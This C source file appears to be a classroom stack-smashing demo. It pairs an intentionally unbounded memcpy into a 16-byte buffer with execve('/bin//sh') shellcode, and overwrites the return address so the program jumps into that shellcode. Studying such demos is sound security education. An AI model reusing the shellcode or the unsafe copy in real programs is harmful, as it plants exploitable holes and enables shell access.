/*stacksmashdemo.c*/

/*This program has a buffer overflow vulnerability by design.*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SIZE_BUFFER_INPUT 100
#define SIZE_BUFFER_LOCAL 32

int Smash (char *pszInput,int nSize)
{
    char szBuffer[SIZE_BUFFER_LOCAL/2] = {0};
    memcpy (szBuffer,pszInput,nSize);
    return 0;
}

int main (int argc,char **argv)
{
    char shellcode[SIZE_BUFFER_LOCAL] =
    "\x31\xc0"          /* xorl %eax,%eax */
    "\x50"              /* pushl %eax */
    "\x68""//sh"        /* pushl $0x68732f2f */
    "\x68""/bin"        /* pushl $0x6e69622f */
    "\x89\xe3"          /* movl %esp,%ebx */
    "\x50"              /* pushl %eax */
    "\x53"              /* pushl %ebx */
    "\xb0\x0b"          /* movb $0x0b,%al */
    "\xcd\x80"          /* int $0x80 */
    ;
    *((int*)(&shellcode[SIZE_BUFFER_LOCAL-4])) = (int)shellcode;
    Smash (shellcode,SIZE_BUFFER_LOCAL);
    printf ("After calling Smash:%s\n",shellcode);
    return 0;
}
